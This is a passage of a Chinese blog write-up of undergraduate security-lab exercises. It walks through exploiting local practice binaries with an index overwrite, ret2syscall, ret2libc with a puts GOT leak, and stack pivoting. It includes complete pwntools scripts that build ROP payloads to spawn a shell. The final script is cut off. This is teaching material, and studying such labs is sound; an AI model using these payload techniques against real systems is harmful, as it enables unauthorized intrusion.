+<p>所以，我们只需要在三次输入的一次中，index = -7，value = 4,195,536(0x4006D0的十进制)，就可以拿到shell了</p>
+<p>本题的脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = process(<span class="string">&#x27;./lab1-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">conn.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">conn.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">&quot;-7&quot;</span>)</span><br><span class="line">conn.sendline(<span class="string">&quot;4195536&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="/images/本科网络安全课实验/9.png" alt=""></p>
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>本次是lab1-2，话不多说，直接上题</p>
+<h2 id="检查-1"><a href="#检查-1" class="headerlink" title="检查"></a>检查</h2><p>使用checksec，发现这次还是开启了NX保护：</p>
+<p><img src="/images/本科网络安全课实验/10.png" alt=""></p>
+<h2 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h2><p>直接运行：</p>
+<p><img src="/images/本科网络安全课实验/11.png" alt=""></p>
+<p>可以看到我们需要先输入一个整数表示字符串长度，然后在一个是否需要修改的询问之后，我们再输入对应长度的数字</p>
+<p>那么这个题能否有溢出呢？我们输入一个比较大的长度试试看：</p>
+<p><img src="/images/本科网络安全课实验/12.png" alt=""></p>
+<p>还是不行，题目提示我们不能输入超过0x20的数字，那么有上限限制，我们能不能输入负数呢？</p>
+<p><img src="/images/本科网络安全课实验/13.png" alt=""></p>
+<p>可见负数虽然通过了检查，但是程序直接退出了，显然我们无法直接输入负数个字符</p>
+<blockquote>
+<p>在刚开始做的时候，由于我只盯着长度考虑，导致做到这里直接无计可施了</p>
+</blockquote>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>既然直接来看不出破绽，我们就使用ida打开</p>
+<p><img src="/images/本科网络安全课实验/14.png" alt=""></p>
+<p>main函数里有三个setvbuf函数，还有一个reader，由于我看到了stdout，stdin等标准输入输出流，所以我感觉这个setvbuf应该是设置系统输入输出的，和实验内容没关系，我们直接点开reader</p>
+<p><img src="/images/本科网络安全课实验/15.png" alt=""></p>
+<p>可以看到首先reader输出了刚刚的提示信息，然后调用了getLens函数来取得数组长度，最后再使用了read函数，将字符串读进来，我们先不急着进入getLens函数，可以看到红色的框标出了buf在栈中的位置，即rsp+0，rbp-30h这个位置，注意看汇编可以知道此时栈开辟了30h的空间所以这两个值其实是一样的。</p>
+<p>知道了buf的位置，我们知道，如果buf长度达到30h+10h，就能够覆盖reader函数的返回地址，即48 <em> 填充字符 + 8 </em> 填充字符 + 8位返回地址</p>
+<p>但我们刚刚运行的时候也发现了，reader的长度是有限制的，这个限制在什么地方呢？我们打开getLens函数看一下：</p>
+<p><img src="/images/本科网络安全课实验/16.png" alt=""></p>
+<p>我们看到，长度会被读入到buf里，然后调用atoi函数，这个函数的作用其实是把字符串转成数字，然后再和32比较，直到长度小于32</p>
+<p>然后程序询问是否修改</p>
+<p>乍一看仿佛没啥问题，但关键就在于这两次读入的长度都是10ull，这个长度表示16个字符，再看它们存放的位置上，可以发现，读入的长度先是存在buf里，通过atoi转为数字后又跑进了v18这个变量中，然后我们会再一次向buf中写数据，以表示是否修改，那么这时候就有问题了，因为v18这个变量，它是个32位整数，位于rbp-4这个位置上，而buf呢，却位于buf-c这个位置</p>
+<p><img src="/images/本科网络安全课实验/17.png" alt=""></p>
+<p>换句话说，第二次的读入和第一次的读入位置只差了8个字符，但第二次却可以最多读入16个字符</p>
+<p><strong>我们只需要在第二次是否确认的位置，先使用8个任意字符+长度a，就可以把第一次的读入给覆盖成我们想要的长度a</strong></p>
+<p>注意长度a是一个byte型，换句话说，如果直接输一个1，因为1的ascii码是49，长度会被覆盖成49，所以有强迫症想要给一个精确长度的话，写脚本时一定要使用bytes</p>
+<p>但其实这里只需要长度能让后面的输入都输进去就像，哪怕你后面只输入了20个字符，你使用很大的长度去覆盖，比如2333(转换成ascii码就是0x32333333，转成十进制就是842,216,243个字符)，也是完全没问题的</p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>能够溢出之后，由于开启了NX，我们不能使用经典栈溢出的思路在栈上执行我们的代码，那么，我们就需要一种名为ROP的思路</p>
+<h3 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h3><p>ROP的全称为Return-oriented programming（返回导向编程），其基本思路就是，你不让我执行我写入的代码，我就执行你的代码，一样可以取得我的目的</p>
+<p>我们思路经典栈溢出我们是怎么劫持控制流的：我们覆盖了函数的返回地址，让函数返回到我们写好的代码上执行，那么我们如果把函数的返回地址覆盖到我们想让函数执行的指令地址，程序也会乖乖地去执行我们想要的指令</p>
+<p>听上去很简单，但还有一个问题：一旦我们让程序去执行我们想要的指令，程序执行完并不会停下来，而是会接着执行下一条指令，就好像程序“逃跑”了，不受我们的控制了。为了让程序还控制在我们的手中，我们需要找到下面这样格式的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址1：</span><br><span class="line">	我们需要的指令;</span><br><span class="line">	ret;</span><br></pre></td></tr></table></figure>
+<p>这样，我们只需要把栈设置成下图的格式：</p>
+<p><img src="/images/本科网络安全课实验/18.png" alt=""></p>
+<p>这样，程序就会先ret，来跳转到地址1，执行完我们需要的指令，再会执行ret，我们之前说过ret的作用，它相当于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rip, [rsp]</span><br><span class="line">sub rsp, 8</span><br></pre></td></tr></table></figure>
+<p>所以，程序跳转到地址1之后，栈帧移动，指向了地址2，再次ret时，程序就会跳到地址2的位置，然后继续，继续，我们可以构造很长很长的ret链，把程序的控制权牢牢地抓在手中</p>
+<p>更详细的介绍可以看这篇博客：</p>
+<p><a href="https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc</a></p>
+<h3 id="如何使用ROP拿到shell"><a href="#如何使用ROP拿到shell" class="headerlink" title="如何使用ROP拿到shell"></a>如何使用ROP拿到shell</h3><p>注意到这题是静态编译的，根据网络大神的经验，我们可以考虑使用ret2syscall的方法</p>
+<h4 id="Linux的系统调用"><a href="#Linux的系统调用" class="headerlink" title="Linux的系统调用"></a>Linux的系统调用</h4><p>关于linux的系统调用的实现：</p>
+<p><img src="/images/本科网络安全课实验/19.png" alt=""></p>
+<p>图片来自博客：<a href="https://blog.csdn.net/qq_33948522/article/details/93880812">https://blog.csdn.net/qq_33948522/article/details/93880812</a></p>
+<h4 id="64位Linux的参数传递规则"><a href="#64位Linux的参数传递规则" class="headerlink" title="64位Linux的参数传递规则"></a>64位Linux的参数传递规则</h4><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
+<p>例如func(a, b, c, d)在调用时，首先要使得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdi = a</span><br><span class="line">rsi = b</span><br><span class="line">rdx = c</span><br><span class="line">rcx = d</span><br></pre></td></tr></table></figure>
+<p>完成上述操作之后，然后调用func函数</p>
+<h4 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h4><p>所谓gadget，英文直译过来是“小工具”的意思，指的是类似于这样的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>这两条指令的特点是：我们只需要把栈上的东西改成：</p>
+<p><img src="/images/本科网络安全课实验/20.png" alt=""></p>
+<p>就可以修改rax的值，之后再继续执行其它的gadget</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>我们要拿到shell，实际上就是要执行execve(“/bin/sh”,null,null)，而这个函数的系统调用号为0x3b</p>
+<p>这意味着，我们需要以此做到这些事情：</p>
+<ul>
+<li><p>把rax赋值为0x3b</p>
+</li>
+<li><p>rdi = “/bin/sh”首地址</p>
+</li>
+<li><p>rsi = rdx = 0</p>
+</li>
+<li><p>执行syscall</p>
+</li>
+</ul>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>我们需要知道的是：</p>
+<ul>
+<li><p>上述rdi，rax，rsi，rdx对应gadget的地址</p>
+</li>
+<li><p>syscall地址</p>
+</li>
+<li><p>“/bin/sh”的地址</p>
+</li>
+</ul>
+<p>使用ROPgadget工具，利用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary lab1-2 --only &quot;pop|ret&quot; | grep &quot;rax&quot;</span><br></pre></td></tr></table></figure>
+<p>找到：</p>
+<p><img src="/images/本科网络安全课实验/21.png" alt=""></p>
+<p>我们使用4005af处的代码段，将其记为rax_ret，以此类推，找到了：</p>
+<p><img src="/images/本科网络安全课实验/22.png" alt=""></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax_ret = 0x4005af</span><br><span class="line">rdi_ret = 0x4006a6</span><br><span class="line">rdx_rsi_ret = 0x44bf29 #这里同时赋值了两个寄存器，道理其实是一样的</span><br><span class="line">syscall = 0x40139c</span><br><span class="line">&quot;/bin/sh&quot; = 6b90ef</span><br></pre></td></tr></table></figure>
+<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>输入长度：任意小于32整数</p>
+<p>是否修改：8 * 任意字符 + 4位以内，且值足够大的bytes输入</p>
+<p>输入：(48 + 8) * 填充字符 + rax_ret + 0x3b + rdi_ret + &amp;”/bin/sh” + rdx_rsi_ret + 0 + 0 + syscall</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = process(<span class="string">&#x27;./lab1-2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&#x27;12345678~&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x4005af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006a6</span></span><br><span class="line">pop_rdx_rsi_ret = <span class="number">0x44bf29</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x6b90f0</span></span><br><span class="line">syscall = <span class="number">0x40139c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/本科网络安全课实验/23.png" alt=""></p>
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="检查-2"><a href="#检查-2" class="headerlink" title="检查"></a>检查</h2><p>拿到Lab1-3，直接checksec：</p>
+<p><img src="/images/本科网络安全课实验/24.png" alt=""></p>
+<p>还是开启了NX保护</p>
+<h2 id="运行-2"><a href="#运行-2" class="headerlink" title="运行"></a>运行</h2><p>我们可以看到，这次的运行和Lab1-2可谓一模一样</p>
+<p><img src="/images/本科网络安全课实验/25.png" alt=""></p>
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>既然一模一样，那么我们能不能使用和Lab1-2一样的方法呢？通过前面实验的分析我们已经知道，只需要在是否修改的回答里，使用字符串覆盖长度，就可以注入任意长的字符，我们顺着思路往下走，回想Lab1-2中，我们要做的是先找到pop rax，pop rdi等指令的地址，还需要找到syscall和”/bin/sh”的地址，但我们这次会发现，源程序中这些指令已经找不齐了：</p>
+<p><img src="/images/本科网络安全课实验/26.png" alt=""></p>
+<p>这是什么原因呢？原理就在编译方式上，这次的程序是动态编译的，不像上次，很多库中的指令都被加载到了程序中。那么，我们在程序中使用的system，printf等函数，都会被存放在系统的一个大的动态链接库里，它们的代码并不写入程序，所以这次很多代码就找不到了</p>
+<p>那么我们怎么实现攻击呢？</p>
+<p>这里，我们就用到了ret2libc的思路，ret2libc，顾名思义，就是返回系统库执行。我们知道，在linux的系统库中，是存在system函数和”/bin/sh”字符串的。那么我们只需要把系统库里的”/bin/sh”地址传给rdi，然后call系统库里的system函数，就能够拿到shell了</p>
+<p>但问题又来了，我们怎么知道系统库里面这些东西的地址呢？</p>
+<p>回想其lab1-1，我们使用了gdb里面的p命令打印了system的地址，我们尝试用同样的方法去打印lab1-3中的system地址：</p>
+<p><img src="/images/本科网络安全课实验/27.png" alt=""></p>
+<p>这是因为lab1-3并没有使用system，因此system在代码中找不到，所以，我们必须另辟蹊径</p>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>使用ldd+程序名这个命令来查看libc库：</p>
+<p><img src="/images/本科网络安全课实验/28.png" alt=""></p>
+<p>可见使用的是libc.so.6库</p>
+<p>尽管我们不知道system的地址，但我们知道它一定在libc库里面，库中任意两个函数或其它东西直接的偏移都是固定的，我们只需要泄露库中某个函数的地址，就可以通过计算偏移找到system和”/bin/sh”的地址</p>
+<p>我们知道，函数的真实地址存放在got表中，如果我们能够泄露got表的内容，就可以得到特定函数的地址</p>
+<p>怎么泄露got表内容呢？我们只需要调用puts函数，再把got表相应位置的地址当做puts的参数，puts就会输出相应位置的内容了</p>
+<p>如何调用puts函数呢？我们只需要像上次lab1-2中一样，构造rop链</p>
+<p>我们不妨就让puts泄露自己的地址</p>
+<p>需要注意的是，调用puts函数需要使用plt表中puts的地址，而泄露地址则需要got表中的内容</p>
+<p>这些都可以通过pwntools的模块方便的实现：</p>
+<ul>
+<li><p>ELF模块可以绑定我们的二进制文件或库</p>
+</li>
+<li><p>ELF.got和ELF.plt分别可以查找got表和plt表</p>
+</li>
+<li><p>ELF.sym可以查询对应符号的位置</p>
+</li>
+<li><p>next(libc.search(b”/bin/sh”))可以找到’/bin/sh’</p>
+</li>
+</ul>
+<p>注意，为了拿到地址，我们必须让输入结束，这样，我们就没有机会继续注入system和’/bin/sh/‘了，因此，我们需要在rop链的底端，再让程序重新跳转会read，第二次读入</p>
+<p>第二次读入的地址可以选在getlens的上面，这样方便再次覆盖长度，这个地址从ida里找到</p>
+<p>我们为了给puts函数传递参数，还需要找到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
+<p>的地址，可以参考上次，使用ROPgadget找到</p>
+<p>第一次读入的rop链示意图：</p>
+<p><img src="/images/本科网络安全课实验/29.png" alt=""></p>
+<p>第二次读入的示意图：</p>
+<p><img src="/images/本科网络安全课实验/30.png" alt=""></p>
+<p><strong>但这时，本该拿到shell的脚本却出错了</strong></p>
+<p>原因在哪儿呢？我们使用gdb来调试，发现在一条名为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movhps  xmm0, [rsp+198h+var_190]</span><br></pre></td></tr></table></figure>
+<p>的指令上出错，原因就是xmm0是一个128位寄存器，对其赋值时，必须取地址能被128整除的位置才行</p>
+<p>我们第二次读入shellcode并执行时，恰巧栈没有128位对齐，也就是执行这条指令时，取数的地址末位不是0，那怎么办呢？我们知道64位系统的栈帧都是64位对齐的，对齐了64位却没有对齐128位只有一种情况，那就是末位是8，所以，我们只需要在第二次注入shellcode的时候，多注入一个空的ret指令，让栈多跳转一次，就能够在执行这条指令的时候让栈的末尾是0了</p>
+<h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./lab1-3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;length:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Need to modify?(y/n)&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;~&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./lab1-3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x400805</span></span><br><span class="line"><span class="comment"># ret_addr = 0x400805</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(puts_got))</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">48</span> + <span class="number">8</span>)</span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;# &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(sh.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line"><span class="comment"># print(hex(puts_real_addr))</span></span><br><span class="line"></span><br><span class="line">base_addr = puts_real_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr = base_addr + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">ret_addr = <span class="number">0x400576</span></span><br><span class="line"></span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"><span class="comment"># payload += p64(ret_addr)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;length:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Need to modify?(y/n)&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;~&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;# &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/本科网络安全课实验/31.png" alt=""></p>
+<h1 id="栈迁移实验"><a href="#栈迁移实验" class="headerlink" title="栈迁移实验"></a>栈迁移实验</h1><h2 id="检查-3"><a href="#检查-3" class="headerlink" title="检查"></a>检查</h2><p>使用checksec指令检查lab1-4：</p>
+<p><img src="/images/本科网络安全课实验/32.png" alt=""></p>
+<p>还是一个NX保护的程序</p>
+<h2 id="运行-3"><a href="#运行-3" class="headerlink" title="运行"></a>运行</h2><p><img src="/images/本科网络安全课实验/33.png" alt=""></p>
+<p>简单粗暴的运行，就一行输入</p>
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>用ida64打开，找到输入的部分：</p>
+<p><img src="/images/本科网络安全课实验/34.png" alt=""></p>
+<p>很明显，数组位于rbp - 0x30的位置却可以读入0x40的字符，找到了溢出点</p>
+<p>但问题是什么，问题就是我们可以溢出的空间只有0x10也就是两个空位，太小了不够我们注入rop链，我们只有一次修改rbp，之后ret的机会</p>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>栈迁移就是用来破解可供溢出的空间太小的，我们从这个函数的汇编中可以看到，函数在调用完成时往往会使用leave指令，而leave指令的作用是调整栈帧，使得rsp等于rbp，然后pop rbp所以一套leave+ret下来，相当于执行了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, rbp</span><br><span class="line">mov rbp, [rsp]</span><br><span class="line">add rsp, 0x8</span><br><span class="line">mov rip, [rsp]</span><br><span class="line">add rsp, 0x8</span><br></pre></td></tr></table></figure>
+<h3 id="第一次读入"><a href="#第一次读入" class="headerlink" title="第一次读入"></a>第一次读入</h3><p>那么我们就在第一次注入时修改rbp的值到bss段，并让返回地址回到read的上方（下图标红），再次读入0x40个字符：</p>
+<p><img src="/images/本科网络安全课实验/35.png" alt=""></p>
+<p><strong>为什么要修改rbp到bss段呢?</strong></p>
+<p>这里主要是要让我们能够控制栈帧的地址，我们知道代码段不能修改，真正的堆栈地址又是不确定的，每次执行可能都不一样，因此运行时可以修改，位置又相对固定的bss段是一个好的选择</p>
+<p>那么我们第一次注入的堆栈可以用下图表示：</p>
+<p><img src="/images/本科网络安全课实验/36.png" alt=""></p>
+<p>我们分析一下，第一次注入后，程序会做什么</p>
+<p>首先，rsp收缩到rbp的位置，然后，rbp被赋值为bss地址，rsp再次上升到read的起始地址，rip被赋值，read指令再次执行</p>
+<h3 id="第二次读入"><a href="#第二次读入" class="headerlink" title="第二次读入"></a>第二次读入</h3><p>在第二次读入之前，我们不妨先看看read是怎么读入的：</p>
+<p><img src="/images/本科网络安全课实验/35.png" alt=""></p>
+<p>可以看到，这里的read函数需要三个参数，rbp+buf也就是rbp-30h，读入位置；有一个参数是40h，读入长度；还有一个是0，不用管它，它是表示读入来源是标准输入</p>
+<p>那么，第二次读入的时候，就会从rbp-30h的位置读入40h个字符，我们这时的rbp已经被我们改成了bss，也就是说，这时我们可以控制的内存是bss-30h到bss+8h的这些</p>
+<p>我们怎么利用这些内存呢?</p>
+<p>先找一个gadget，这个gadget形式应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>很容易找，上图的read函数下面就有一个，记起首地址为laeve_ret</p>
+<p>我们先把第二次read的返回地址改为leave_ret会发生什么？</p>
+<p>简单分析一下：</p>
+<p><img src="/images/本科网络安全课实验/37.png" alt=""></p>
+<p>第二次read完，由于read下面就有一个leave和ret，所以会紧接着执行leave，使得rsp=rbp，然后相当于pop rbp，即rbp = [rsp]，也就是rbp = [rbp]=[bss]，然后rsp+=0x8</p>
+<p>此时rbp=[bss]，rsp=bss+0x8</p>
+<p>然后ret，rip=[rsp]=[bss+0x8]</p>
+<p>rsp+=0x8，即rsp=bss+0x10</p>
+<p>从图上可以看到bss+0x8就是我们预设的leave_ret地址，此时程序会再次执行leave_ret，使得：</p>
+<p>rsp=rbp=[bss]</p>
+<p>rbp=[rbp]=[[bss]]</p>
+<p>rsp+=0x8—–&gt;rsp=[bss]+0x8</p>
+<p>rip=[rsp]=[[bss]-0x8]</p>
+<p>rsp+=0x8—–&gt;rsp=[bss]+0x10</p>
+<p>这里的bss就是图中我们第二次注入的rbp，设它的值为rbp2</p>
+<p>那么有：</p>
+<p>rsp=rbp2+0x10</p>
+<p>程序跳转到[rbp2+0x8]的位置，我们不妨就让这个位置指向我们可以控制的内存的顶部：</p>
+<p><img src="/images/本科网络安全课实验/38.png" alt=""></p>
+<p>这样，程序跳过来之后，又会继续向上走，就可以在这里构造一条ROP链，来输出puts函数的地址了</p>
+<p>先计算一下第二次的rbp2应该是多少：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbp2+0x8 = bss-0x30</span><br></pre></td></tr></table></figure>
+<p>rbp2 = bss-0x38</p>
+<p>然后，为了泄露puts函数的地址，我们还是用rdi_ret这个gadget传参，参数为puts的got表，然后调用puts的glt表地址</p>
+<p>为了接下来能继续注入，我们最后再次调用一下read，我在做的时候又一次调用了main函数，其实也是一样的</p>
+<p>这样，第二次的输入如下：</p>
+<p><img src="/images/本科网络安全课实验/39.png" alt=""></p>
+<h3 id="第三次读入"><a href="#第三次读入" class="headerlink" title="第三次读入"></a>第三次读入</h3><p>第三次读入又是从主函数进入</p>
+<p>和第一次读入可以一模一样，其目的都是为了把栈迁移到一个可控的地方，以便下次读入</p>
+<h3 id="第四次读入"><a href="#第四次读入" class="headerlink" title="第四次读入"></a>第四次读入</h3><p>使用输入的puts函数地址计算system和”/bin/sh”的地址，拿到shell</p>
+<p><img src="/images/本科网络安全课实验/40.png" alt=""></p>
+<h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 